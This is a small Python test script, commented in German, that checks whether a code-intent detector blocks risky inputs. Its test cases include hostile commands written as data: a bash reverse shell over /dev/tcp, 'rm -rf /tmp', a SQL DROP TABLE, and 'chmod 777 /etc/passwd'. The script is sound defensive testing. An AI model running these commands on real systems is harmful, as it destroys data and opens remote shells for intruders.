#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Quick Test - Direkte Funktionstest ohne Services"""

import sys
from pathlib import Path

# Add paths
project_root = Path(__file__).parent
sys.path.insert(0, str(project_root / "src"))
sys.path.insert(0, str(project_root / "detectors" / "code_intent_service"))

# Import function
try:
    from main import analyze_code_rules
    print("✓ Import erfolgreich")
except Exception as e:
    print(f"✗ Import fehlgeschlagen: {e}")
    sys.exit(1)

# Test cases
test_cases = [
    ("rm -rf /tmp", True, "Destruktive Dateioperation"),
    ("DROP TABLE users;", True, "SQL Destruktion"),
    ("echo 'Hello World'", False, "Benigne Shell-Kommando"),
    ("SELECT * FROM users", False, "Benigne SQL Query"),
    ("bash -i >& /dev/tcp/192.168.1.1/8080", True, "Reverse Shell"),
    ("chmod 777 /etc/passwd", True, "Permission Escalation"),
]

print("\n" + "=" * 80)
print("SCORE-BERECHNUNG TEST")
print("=" * 80 + "\n")

all_passed = True

for text, should_block, description in test_cases:
    try:
        scores, patterns = analyze_code_rules(text)
        risk_score = scores["cybercrime"]
        verdict = "block" if risk_score > 0.5 else "allow"
        should_be = "block" if should_block else "allow"
        
        passed = verdict == should_be
        status = "✓" if passed else "✗"
        
        if not passed:
            all_passed = False
        
        print(f"{status} {text[:55]:<55}")
        print(f"   Score: {risk_score:.3f} | Verdict: {verdict:5s} (erwartet: {should_be:5s})")
        print(f"   Patterns: {patterns if patterns else 'keine'}")
        print()
        
    except Exception as e:
        print(f"✗ Fehler bei Test: {e}")
        all_passed = False
        print()

print("=" * 80)
if all_passed:
    print("✓ ALLE TESTS BESTANDEN")
else:
    print("✗ EINIGE TESTS FEHLGESCHLAGEN")
print("=" * 80)

sys.exit(0 if all_passed else 1)


